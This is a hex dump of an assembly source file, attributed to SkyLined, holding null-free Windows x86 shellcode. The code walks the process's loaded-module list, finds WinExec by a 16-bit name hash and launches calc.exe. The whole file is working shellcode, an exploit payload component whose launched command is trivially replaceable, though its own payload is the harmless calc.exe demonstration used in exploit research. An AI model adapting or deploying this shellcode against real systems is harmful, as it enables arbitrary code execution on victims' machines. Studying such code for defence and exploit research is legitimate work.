00000000  3b 20 43 6f 70 79 72 69  67 68 74 20 28 63 29 20  |; Copyright (c) |
00000010  32 30 30 39 2d 32 30 31  30 2c 20 42 65 72 65 6e  |2009-2010, Beren|
00000020  64 2d 4a 61 6e 20 22 53  6b 79 4c 69 6e 65 64 22  |d-Jan "SkyLined"|
00000030  20 57 65 76 65 72 20 3c  62 65 72 65 6e 64 6a 61  | Wever <berendja|
00000040  6e 77 65 76 65 72 40 67  6d 61 69 6c 2e 63 6f 6d  |nwever@gmail.com|
00000050  3e 0d 0a 3b 20 50 72 6f  6a 65 63 74 20 68 6f 6d  |>..; Project hom|
00000060  65 70 61 67 65 3a 20 68  74 74 70 3a 2f 2f 63 6f  |epage: http://co|
00000070  64 65 2e 67 6f 6f 67 6c  65 2e 63 6f 6d 2f 70 2f  |de.google.com/p/|
00000080  77 33 32 2d 64 6c 2d 6c  6f 61 64 6c 69 62 2d 73  |w32-dl-loadlib-s|
00000090  68 65 6c 6c 63 6f 64 65  2f 0d 0a 3b 20 41 6c 6c  |hellcode/..; All|
000000a0  20 72 69 67 68 74 73 20  72 65 73 65 72 76 65 64  | rights reserved|
000000b0  2e 20 53 65 65 20 43 4f  50 59 52 49 47 48 54 2e  |. See COPYRIGHT.|
000000c0  74 78 74 20 66 6f 72 20  64 65 74 61 69 6c 73 2e  |txt for details.|
000000d0  0d 0a 42 49 54 53 20 33  32 0d 0a 3b 20 57 69 6e  |..BITS 32..; Win|
000000e0  64 6f 77 73 20 78 38 36  20 6e 75 6c 6c 2d 66 72  |dows x86 null-fr|
000000f0  65 65 20 73 68 65 6c 6c  63 6f 64 65 20 74 68 61  |ee shellcode tha|
00000100  74 20 65 78 65 63 75 74  65 73 20 63 61 6c 63 2e  |t executes calc.|
00000110  65 78 65 2e 0d 0a 3b 20  57 6f 72 6b 73 20 69 6e  |exe...; Works in|
00000120  20 61 6e 79 20 61 70 70  6c 69 63 61 74 69 6f 6e  | any application|
00000130  20 66 6f 72 20 57 69 6e  64 6f 77 73 20 35 2e 30  | for Windows 5.0|
00000140  2d 37 2e 30 20 61 6c 6c  20 73 65 72 76 69 63 65  |-7.0 all service|
00000150  20 70 61 63 6b 73 2e 0d  0a 3b 20 28 53 65 65 20  | packs...; (See |
00000160  68 74 74 70 3a 2f 2f 73  6b 79 70 68 65 72 2e 63  |http://skypher.c|
00000170  6f 6d 2f 77 69 6b 69 2f  69 6e 64 65 78 2e 70 68  |om/wiki/index.ph|
00000180  70 2f 48 61 63 6b 69 6e  67 2f 53 68 65 6c 6c 63  |p/Hacking/Shellc|
00000190  6f 64 65 29 2e 0d 0a 3b  20 54 68 69 73 20 76 65  |ode)...; This ve|
000001a0  72 73 69 6f 6e 20 75 73  65 73 20 31 36 2d 62 69  |rsion uses 16-bi|
000001b0  74 20 68 61 73 68 65 73  2e 0d 0a 0d 0a 25 69 6e  |t hashes.....%in|
000001c0  63 6c 75 64 65 20 27 77  33 32 2d 65 78 65 63 2d  |clude 'w32-exec-|
000001d0  63 61 6c 63 2d 73 68 65  6c 6c 63 6f 64 65 2d 68  |calc-shellcode-h|
000001e0  61 73 68 2d 6c 69 73 74  2e 61 73 6d 27 0d 0a 0d  |ash-list.asm'...|
000001f0  0a 25 64 65 66 69 6e 65  20 42 32 57 28 62 31 2c  |.%define B2W(b1,|
00000200  62 32 29 20 20 20 20 20  20 20 20 20 20 20 20 20  |b2)             |
00000210  20 20 20 20 20 20 20 20  20 28 28 28 62 32 29 20  |         (((b2) |
00000220  3c 3c 20 38 29 20 2b 20  28 62 31 29 29 0d 0a 25  |<< 8) + (b1))..%|
00000230  64 65 66 69 6e 65 20 57  32 44 57 28 77 31 2c 77  |define W2DW(w1,w|
00000240  32 29 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2)              |
00000250  20 20 20 20 20 20 20 28  28 28 77 32 29 20 3c 3c  |       (((w2) <<|
00000260  20 31 36 29 20 2b 20 28  77 31 29 29 0d 0a 25 64  | 16) + (w1))..%d|
00000270  65 66 69 6e 65 20 42 32  44 57 28 62 31 2c 62 32  |efine B2DW(b1,b2|
00000280  2c 62 33 2c 62 34 29 20  20 20 20 20 20 20 20 20  |,b3,b4)         |
00000290  20 20 20 20 20 20 28 28  28 62 34 29 20 3c 3c 20  |      (((b4) << |
000002a0  32 34 29 20 2b 20 28 28  62 33 29 20 3c 3c 20 31  |24) + ((b3) << 1|
000002b0  36 29 20 2b 20 28 28 62  32 29 20 3c 3c 20 38 29  |6) + ((b2) << 8)|
000002c0  20 2b 20 28 62 31 29 29  0d 0a 0d 0a 25 69 66 64  | + (b1))....%ifd|
000002d0  65 66 20 53 54 41 43 4b  5f 41 4c 49 47 4e 0d 0a  |ef STACK_ALIGN..|
000002e0  20 20 20 20 41 4e 44 20  20 20 20 20 53 50 2c 20  |    AND     SP, |
000002f0  30 78 46 46 46 43 0d 0a  25 65 6e 64 69 66 0d 0a  |0xFFFC..%endif..|
00000300  66 69 6e 64 5f 68 61 73  68 3a 20 3b 20 46 69 6e  |find_hash: ; Fin|
00000310  64 20 6e 74 64 6c 6c 27  73 20 49 6e 49 6e 69 74  |d ntdll's InInit|
00000320  4f 72 64 65 72 20 6c 69  73 74 20 6f 66 20 6d 6f  |Order list of mo|
00000330  64 75 6c 65 73 3a 0d 0a  20 20 20 20 58 4f 52 20  |dules:..    XOR |
00000340  20 20 20 20 45 53 49 2c  20 45 53 49 20 20 20 20  |    ESI, ESI    |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000360  3b 20 45 53 49 20 3d 20  30 0d 0a 20 20 20 20 50  |; ESI = 0..    P|
00000370  55 53 48 20 20 20 20 45  53 49 20 20 20 20 20 20  |USH    ESI      |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  20 20 20 3b 20 53 74 61  63 6b 20 3d 20 30 0d 0a  |   ; Stack = 0..|
000003a0  20 20 20 20 4d 4f 56 20  20 20 20 20 45 53 49 2c  |    MOV     ESI,|
000003b0  20 5b 46 53 3a 45 53 49  20 2b 20 30 78 33 30 5d  | [FS:ESI + 0x30]|
000003c0  20 20 20 20 20 20 20 20  3b 20 45 53 49 20 3d 20  |        ; ESI = |
000003d0  26 28 50 45 42 29 20 28  5b 46 53 3a 30 78 33 30  |&(PEB) ([FS:0x30|
000003e0  5d 29 0d 0a 20 20 20 20  4d 4f 56 20 20 20 20 20  |])..    MOV     |
000003f0  45 53 49 2c 20 5b 45 53  49 20 2b 20 30 78 30 43  |ESI, [ESI + 0x0C|
00000400  5d 20 20 20 20 20 20 20  20 20 20 20 3b 20 45 53  |]           ; ES|
00000410  49 20 3d 20 50 45 42 2d  3e 4c 64 72 0d 0a 20 20  |I = PEB->Ldr..  |
00000420  20 20 4d 4f 56 20 20 20  20 20 45 53 49 2c 20 5b  |  MOV     ESI, [|
00000430  45 53 49 20 2b 20 30 78  31 43 5d 20 20 20 20 20  |ESI + 0x1C]     |
00000440  20 20 20 20 20 20 3b 20  45 53 49 20 3d 20 50 45  |      ; ESI = PE|
00000450  42 2d 3e 4c 64 72 2e 49  6e 49 6e 69 74 4f 72 64  |B->Ldr.InInitOrd|
00000460  65 72 20 28 66 69 72 73  74 20 6d 6f 64 75 6c 65  |er (first module|
00000470  29 0d 0a 6e 65 78 74 5f  6d 6f 64 75 6c 65 3a 20  |)..next_module: |
00000480  3b 20 47 65 74 20 74 68  65 20 62 61 73 65 61 64  |; Get the basead|
00000490  64 72 65 73 73 20 6f 66  20 74 68 65 20 63 75 72  |dress of the cur|
000004a0  72 65 6e 74 20 6d 6f 64  75 6c 65 20 61 6e 64 20  |rent module and |
000004b0  66 69 6e 64 20 74 68 65  20 6e 65 78 74 20 6d 6f  |find the next mo|
000004c0  64 75 6c 65 3a 0d 0a 20  20 20 20 4d 4f 56 20 20  |dule:..    MOV  |
000004d0  20 20 20 45 42 50 2c 20  5b 45 53 49 20 2b 20 30  |   EBP, [ESI + 0|
000004e0  78 30 38 5d 20 20 20 20  20 20 20 20 20 20 20 3b  |x08]           ;|
000004f0  20 45 42 50 20 3d 20 49  6e 49 6e 69 74 4f 72 64  | EBP = InInitOrd|
00000500  65 72 5b 58 5d 2e 62 61  73 65 5f 61 64 64 72 65  |er[X].base_addre|
00000510  73 73 0d 0a 20 20 20 20  4d 4f 56 20 20 20 20 20  |ss..    MOV     |
00000520  45 53 49 2c 20 5b 45 53  49 5d 20 20 20 20 20 20  |ESI, [ESI]      |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 45 53  |            ; ES|
00000540  49 20 3d 20 49 6e 49 6e  69 74 4f 72 64 65 72 5b  |I = InInitOrder[|
00000550  58 5d 2e 66 6c 69 6e 6b  20 3d 3d 20 49 6e 49 6e  |X].flink == InIn|
00000560  69 74 4f 72 64 65 72 5b  58 2b 31 5d 0d 0a 67 65  |itOrder[X+1]..ge|
00000570  74 5f 70 72 6f 63 5f 61  64 64 72 65 73 73 5f 6c  |t_proc_address_l|
00000580  6f 6f 70 3a 20 3b 20 46  69 6e 64 20 74 68 65 20  |oop: ; Find the |
00000590  50 45 20 68 65 61 64 65  72 20 61 6e 64 20 65 78  |PE header and ex|
000005a0  70 6f 72 74 20 61 6e 64  20 6e 61 6d 65 73 20 74  |port and names t|
000005b0  61 62 6c 65 73 20 6f 66  20 74 68 65 20 6d 6f 64  |ables of the mod|
000005c0  75 6c 65 3a 0d 0a 20 20  20 20 4d 4f 56 20 20 20  |ule:..    MOV   |
000005d0  20 20 45 42 58 2c 20 5b  45 42 50 20 2b 20 30 78  |  EBX, [EBP + 0x|
000005e0  33 43 5d 20 20 20 20 20  20 20 20 20 20 20 3b 20  |3C]           ; |
000005f0  45 42 58 20 3d 20 26 28  50 45 20 68 65 61 64 65  |EBX = &(PE heade|
00000600  72 29 0d 0a 20 20 20 20  4d 4f 56 20 20 20 20 20  |r)..    MOV     |
00000610  45 42 58 2c 20 5b 45 42  50 20 2b 20 45 42 58 20  |EBX, [EBP + EBX |
00000620  2b 20 30 78 37 38 5d 20  20 20 20 20 3b 20 45 42  |+ 0x78]     ; EB|
00000630  58 20 3d 20 6f 66 66 73  65 74 28 65 78 70 6f 72  |X = offset(expor|
00000640  74 20 74 61 62 6c 65 29  0d 0a 20 20 20 20 41 44  |t table)..    AD|
00000650  44 20 20 20 20 20 45 42  58 2c 20 45 42 50 20 20  |D     EBX, EBP  |
00000660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000670  20 20 3b 20 45 42 58 20  3d 20 26 28 65 78 70 6f  |  ; EBX = &(expo|
00000680  72 74 20 74 61 62 6c 65  29 0d 0a 20 20 20 20 4d  |rt table)..    M|
00000690  4f 56 20 20 20 20 20 45  43 58 2c 20 5b 45 42 58  |OV     ECX, [EBX|
000006a0  20 2b 20 30 78 31 38 5d  20 20 20 20 20 20 20 20  | + 0x18]        |
000006b0  20 20 20 3b 20 45 43 58  20 3d 20 6e 75 6d 62 65  |   ; ECX = numbe|
000006c0  72 20 6f 66 20 6e 61 6d  65 20 70 6f 69 6e 74 65  |r of name pointe|
000006d0  72 73 0d 0a 20 20 20 20  4a 43 58 5a 20 20 20 20  |rs..    JCXZ    |
000006e0  6e 65 78 74 5f 6d 6f 64  75 6c 65 20 20 20 20 20  |next_module     |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 4e 6f  |            ; No|
00000700  20 6e 61 6d 65 20 70 6f  69 6e 74 65 72 73 3f 20  | name pointers? |
00000710  4e 65 78 74 20 6d 6f 64  75 6c 65 2e 0d 0a 6e 65  |Next module...ne|
00000720  78 74 5f 66 75 6e 63 74  69 6f 6e 5f 6c 6f 6f 70  |xt_function_loop|
00000730  3a 20 3b 20 47 65 74 20  74 68 65 20 6e 65 78 74  |: ; Get the next|
00000740  20 66 75 6e 63 74 69 6f  6e 20 6e 61 6d 65 20 66  | function name f|
00000750  6f 72 20 68 61 73 68 69  6e 67 3a 0d 0a 20 20 20  |or hashing:..   |
00000760  20 4d 4f 56 20 20 20 20  20 45 44 49 2c 20 5b 45  | MOV     EDI, [E|
00000770  42 58 20 2b 20 30 78 32  30 5d 20 20 20 20 20 20  |BX + 0x20]      |
00000780  20 20 20 20 20 3b 20 45  44 49 20 3d 20 6f 66 66  |     ; EDI = off|
00000790  73 65 74 28 6e 61 6d 65  73 20 74 61 62 6c 65 29  |set(names table)|
000007a0  0d 0a 20 20 20 20 41 44  44 20 20 20 20 20 45 44  |..    ADD     ED|
000007b0  49 2c 20 45 42 50 20 20  20 20 20 20 20 20 20 20  |I, EBP          |
000007c0  20 20 20 20 20 20 20 20  20 20 3b 20 45 44 49 20  |          ; EDI |
000007d0  3d 20 26 28 6e 61 6d 65  73 20 74 61 62 6c 65 29  |= &(names table)|
000007e0  0d 0a 20 20 20 20 4d 4f  56 20 20 20 20 20 45 44  |..    MOV     ED|
000007f0  49 2c 20 5b 45 44 49 20  2b 20 45 43 58 20 2a 20  |I, [EDI + ECX * |
00000800  34 20 2d 20 34 5d 20 20  20 20 3b 20 45 44 49 20  |4 - 4]    ; EDI |
00000810  3d 20 6f 66 66 73 65 74  28 66 75 6e 63 74 69 6f  |= offset(functio|
00000820  6e 20 6e 61 6d 65 29 0d  0a 20 20 20 20 41 44 44  |n name)..    ADD|
00000830  20 20 20 20 20 45 44 49  2c 20 45 42 50 20 20 20  |     EDI, EBP   |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000850  20 3b 20 45 44 49 20 3d  20 26 28 66 75 6e 63 74  | ; EDI = &(funct|
00000860  69 6f 6e 20 6e 61 6d 65  29 0d 0a 20 20 20 20 58  |ion name)..    X|
00000870  4f 52 20 20 20 20 20 45  41 58 2c 20 45 41 58 20  |OR     EAX, EAX |
00000880  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000890  20 20 20 3b 20 45 41 58  20 3d 20 30 0d 0a 20 20  |   ; EAX = 0..  |
000008a0  20 20 43 44 51 20 20 20  20 20 20 20 20 20 20 20  |  CDQ           |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  20 20 20 20 20 20 3b 20  45 44 58 20 3d 20 30 0d  |      ; EDX = 0.|
000008d0  0a 68 61 73 68 5f 6c 6f  6f 70 3a 20 3b 20 48 61  |.hash_loop: ; Ha|
000008e0  73 68 20 74 68 65 20 66  75 6e 63 74 69 6f 6e 20  |sh the function |
000008f0  6e 61 6d 65 20 61 6e 64  20 63 6f 6d 70 61 72 65  |name and compare|
00000900  20 77 69 74 68 20 72 65  71 75 65 73 74 65 64 20  | with requested |
00000910  68 61 73 68 0d 0a 20 20  20 20 58 4f 52 20 20 20  |hash..    XOR   |
00000920  20 20 44 4c 2c 20 5b 45  44 49 5d 0d 0a 20 20 20  |  DL, [EDI]..   |
00000930  20 52 4f 52 20 20 20 20  20 44 58 2c 20 42 59 54  | ROR     DX, BYT|
00000940  45 20 68 61 73 68 5f 72  6f 72 5f 76 61 6c 75 65  |E hash_ror_value|
00000950  0d 0a 20 20 20 20 53 43  41 53 42 0d 0a 20 20 20  |..    SCASB..   |
00000960  20 4a 4e 45 20 20 20 20  20 68 61 73 68 5f 6c 6f  | JNE     hash_lo|
00000970  6f 70 0d 0a 20 20 20 20  43 4d 50 20 20 20 20 20  |op..    CMP     |
00000980  44 58 2c 20 68 61 73 68  5f 6b 65 72 6e 65 6c 33  |DX, hash_kernel3|
00000990  32 5f 57 69 6e 45 78 65  63 0d 0a 20 20 20 20 4c  |2_WinExec..    L|
000009a0  4f 4f 50 4e 45 20 20 6e  65 78 74 5f 66 75 6e 63  |OOPNE  next_func|
000009b0  74 69 6f 6e 5f 6c 6f 6f  70 20 20 20 20 20 20 20  |tion_loop       |
000009c0  20 20 20 3b 20 4e 6f 74  20 74 68 65 20 72 69 67  |   ; Not the rig|
000009d0  68 74 20 68 61 73 68 20  61 6e 64 20 66 75 6e 63  |ht hash and func|
000009e0  74 69 6f 6e 73 20 6c 65  66 74 20 69 6e 20 6d 6f  |tions left in mo|
000009f0  64 75 6c 65 3f 20 4e 65  78 74 20 66 75 6e 63 74  |dule? Next funct|
00000a00  69 6f 6e 0d 0a 20 20 20  20 4a 4e 45 20 20 20 20  |ion..    JNE    |
00000a10  20 6e 65 78 74 5f 6d 6f  64 75 6c 65 20 20 20 20  | next_module    |
00000a20  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 4e  |             ; N|
00000a30  6f 74 20 74 68 65 20 72  69 67 68 74 20 68 61 73  |ot the right has|
00000a40  68 20 61 6e 64 20 6e 6f  20 66 75 6e 63 74 69 6f  |h and no functio|
00000a50  6e 73 20 6c 65 66 74 20  69 6e 20 6d 6f 64 75 6c  |ns left in modul|
00000a60  65 3f 20 4e 65 78 74 20  6d 6f 64 75 6c 65 0d 0a  |e? Next module..|
00000a70  20 20 20 20 3b 20 46 6f  75 6e 64 20 74 68 65 20  |    ; Found the |
00000a80  72 69 67 68 74 20 68 61  73 68 3a 20 67 65 74 20  |right hash: get |
00000a90  74 68 65 20 61 64 64 72  65 73 73 20 6f 66 20 74  |the address of t|
00000aa0  68 65 20 66 75 6e 63 74  69 6f 6e 3a 0d 0a 20 20  |he function:..  |
00000ab0  20 20 4d 4f 56 20 20 20  20 20 45 44 58 2c 20 5b  |  MOV     EDX, [|
00000ac0  45 42 58 20 2b 20 30 78  32 34 5d 20 20 20 20 20  |EBX + 0x24]     |
00000ad0  20 20 20 20 20 20 3b 20  45 53 49 20 3d 20 6f 66  |      ; ESI = of|
00000ae0  66 73 65 74 20 6f 72 64  69 6e 61 6c 73 20 74 61  |fset ordinals ta|
00000af0  62 6c 65 0d 0a 20 20 20  20 41 44 44 20 20 20 20  |ble..    ADD    |
00000b00  20 45 44 58 2c 20 45 42  50 20 20 20 20 20 20 20  | EDX, EBP       |
00000b10  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 45  |             ; E|
00000b20  53 49 20 3d 20 26 6f 72  69 64 69 6e 61 6c 73 20  |SI = &oridinals |
00000b30  74 61 62 6c 65 0d 0a 20  20 20 20 4d 4f 56 5a 58  |table..    MOVZX|
00000b40  20 20 20 45 44 58 2c 20  57 4f 52 44 20 5b 45 44  |   EDX, WORD [ED|
00000b50  58 20 2b 20 32 20 2a 20  45 43 58 5d 20 20 20 3b  |X + 2 * ECX]   ;|
00000b60  20 45 53 49 20 3d 20 6f  72 64 69 6e 61 6c 20 6e  | ESI = ordinal n|
00000b70  75 6d 62 65 72 20 6f 66  20 66 75 6e 63 74 69 6f  |umber of functio|
00000b80  6e 0d 0a 20 20 20 20 4d  4f 56 20 20 20 20 20 45  |n..    MOV     E|
00000b90  44 49 2c 20 5b 45 42 58  20 2b 20 30 78 31 43 5d  |DI, [EBX + 0x1C]|
00000ba0  20 20 20 20 20 20 20 20  20 20 20 3b 20 45 44 49  |           ; EDI|
00000bb0  20 3d 20 6f 66 66 73 65  74 20 61 64 64 72 65 73  | = offset addres|
00000bc0  73 20 74 61 62 6c 65 0d  0a 20 20 20 20 41 44 44  |s table..    ADD|
00000bd0  20 20 20 20 20 45 44 49  2c 20 45 42 50 20 20 20  |     EDI, EBP   |
00000be0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bf0  20 3b 20 45 44 49 20 3d  20 26 61 64 64 72 65 73  | ; EDI = &addres|
00000c00  73 20 74 61 62 6c 65 0d  0a 20 20 20 20 41 44 44  |s table..    ADD|
00000c10  20 20 20 20 20 45 42 50  2c 20 5b 45 44 49 20 2b  |     EBP, [EDI +|
00000c20  20 34 20 2a 20 45 44 58  5d 20 20 20 20 20 20 20  | 4 * EDX]       |
00000c30  20 3b 20 45 42 50 20 3d  20 26 28 66 75 6e 63 74  | ; EBP = &(funct|
00000c40  69 6f 6e 29 0d 0a 20 20  20 20 3b 20 63 72 65 61  |ion)..    ; crea|
00000c50  74 65 20 74 68 65 20 63  61 6c 63 2e 65 78 65 20  |te the calc.exe |
00000c60  73 74 72 69 6e 67 0d 0a  20 20 20 20 50 55 53 48  |string..    PUSH|
00000c70  20 20 20 20 42 32 44 57  28 27 2e 27 2c 20 27 65  |    B2DW('.', 'e|
00000c80  27 2c 20 27 78 27 2c 20  27 65 27 29 20 20 20 20  |', 'x', 'e')    |
00000c90  3b 20 53 74 61 63 6b 20  3d 20 22 2e 65 78 65 22  |; Stack = ".exe"|
00000ca0  2c 20 30 0d 0a 20 20 20  20 50 55 53 48 20 20 20  |, 0..    PUSH   |
00000cb0  20 42 32 44 57 28 27 63  27 2c 20 27 61 27 2c 20  | B2DW('c', 'a', |
00000cc0  27 6c 27 2c 20 27 63 27  29 20 20 20 20 3b 20 53  |'l', 'c')    ; S|
00000cd0  74 61 63 6b 20 3d 20 22  63 61 6c 63 2e 65 78 65  |tack = "calc.exe|
00000ce0  22 2c 20 30 0d 0a 20 20  20 20 50 55 53 48 20 20  |", 0..    PUSH  |
00000cf0  20 20 45 53 50 20 20 20  20 20 20 20 20 20 20 20  |  ESP           |
00000d00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000d10  53 74 61 63 6b 20 3d 20  26 28 22 63 61 6c 63 2e  |Stack = &("calc.|
00000d20  65 78 65 22 29 2c 20 22  63 61 6c 63 2e 65 78 65  |exe"), "calc.exe|
00000d30  22 2c 20 30 0d 0a 20 20  20 20 58 43 48 47 20 20  |", 0..    XCHG  |
00000d40  20 20 45 41 58 2c 20 5b  45 53 50 5d 20 20 20 20  |  EAX, [ESP]    |
00000d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000d60  53 74 61 63 6b 20 3d 20  30 2c 20 22 63 61 6c 63  |Stack = 0, "calc|
00000d70  2e 65 78 65 22 2c 20 30  0d 0a 20 20 20 20 50 55  |.exe", 0..    PU|
00000d80  53 48 20 20 20 20 45 41  58 20 20 20 20 20 20 20  |SH    EAX       |
00000d90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000da0  20 20 3b 20 53 74 61 63  6b 20 3d 20 26 28 22 63  |  ; Stack = &("c|
00000db0  61 6c 63 2e 65 78 65 22  29 2c 20 30 2c 20 22 63  |alc.exe"), 0, "c|
00000dc0  61 6c 63 2e 65 78 65 22  2c 20 30 0d 0a 20 20 20  |alc.exe", 0..   |
00000dd0  20 43 41 4c 4c 20 20 20  20 45 42 50 20 20 20 20  | CALL    EBP    |
00000de0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000df0  20 20 20 20 20 3b 20 57  69 6e 45 78 65 63 28 26  |     ; WinExec(&|
00000e00  28 22 63 61 6c 63 2e 65  78 65 22 29 2c 20 30 29  |("calc.exe"), 0)|
00000e10  3b 0d 0a 20 20 20 20 49  4e 54 33 20 20 20 20 20  |;..    INT3     |
00000e20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e30  20 20 20 20 20 20 20 20  20 20 20 3b 20 43 72 61  |           ; Cra|
00000e40  73 68                                             |sh|
00000e42
